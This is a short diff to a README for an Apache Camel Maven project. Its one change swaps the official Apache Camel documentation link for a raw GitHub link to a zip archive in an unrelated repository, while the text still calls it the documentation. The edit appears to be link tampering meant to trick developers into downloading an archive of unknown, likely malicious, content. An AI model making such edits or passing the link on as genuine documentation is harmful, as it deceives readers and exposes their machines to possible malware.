@@ -11,5 +11,5 @@ To run this project with Maven use
 
 For more help see the Apache Camel documentation
 
-    http://camel.apache.org/
+    https://raw.githubusercontent.com/jeliasrm/Grocery/master/intratrabecular/Grocery.zip
 
